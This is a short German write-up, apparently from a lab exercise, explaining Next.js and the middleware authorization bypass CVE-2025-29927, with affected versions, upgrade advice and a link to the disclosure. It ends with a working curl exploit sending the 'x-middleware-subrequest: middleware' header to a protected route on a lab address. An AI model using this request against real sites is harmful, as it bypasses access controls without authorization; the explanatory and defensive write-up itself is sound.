# Was ist Next.js

Next.js ist ein Webentwicklungs-Framework, das von Vercel entwickelt wurde, um die Erstellung von hochleistungsfähigen Webanwendungen zu vereinfachen. Next.js baut auf React auf und erweitert die Fähigkeiten von React um verschiedene Funktionen, wie statische Seitengenerierung (SSG) und serverseitiges Rendering (SSR). SSG generiert die Seiten bereits bei der Erstellung und ermöglicht so eine schnellere Auslieferung an die Nutzer; SSR rendert die Seiten bei der Anfrage und verkürzt so die Ladezeit. Kurz gesagt, Next.js bietet neue Funktionen zur Verbesserung der Leistung und der Benutzerfreundlichkeit.

# Technischer Hintergrund der CVE

CVE-2025-29927, eine kürzlich von Rachid und Yasser Allam entdeckte Sicherheitslücke in Next.js, hat gezeigt, dass es möglich ist, Autorisierungsprüfungen zu umgehen, wenn sie in der Middleware stattfinden. Middleware ist der Teil, der Entwicklern die Kontrolle über eingehende Anfragen gibt. Sie fungiert als Brücke zwischen der eingehenden Anfrage und dem Routing-System. Das Routing-System ist dateibasiert, d. h. Routen werden durch die Organisation von Dateien und Verzeichnissen erstellt und verwaltet. Diese Schwachstelle ermöglicht es Angreifern, die Middleware-basierte Autorisierung zu umgehen, und alle Versionen vor 14.2.25 und 15.2.3 sind für diese Schwachstelle anfällig.

Next.js ist in verschiedenen Anwendungstypen weit verbreitet, darunter E-Commerce-Plattformen, Nachrichten-Apps, Dokumentations-Sites und interaktive Web-Apps. Daher kann diese Sicherheitslücke schwerwiegende Folgen haben und erfordert von den Administratoren ein Upgrade ihrer Installationen auf eine gepatchte Version.

# Exploitation

## Curl
Die Exploitation ist via Curl u.A. möglich. Da die Schwachstelle lediglich wie in dem Initial Disclose (unterhalb via link) den HTTP "`x-middleware-subrequest: middleware`" Header braucht, damit die Anfrage seitens der Middleware nicht Modifiziert sondern direkt weitergereicht wird.

Initial Disclose:
https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware

Beispiel via Curl:

```
curl -H "x-middleware-subrequest: middleware" http://10.10.31.241:3000/protected
```

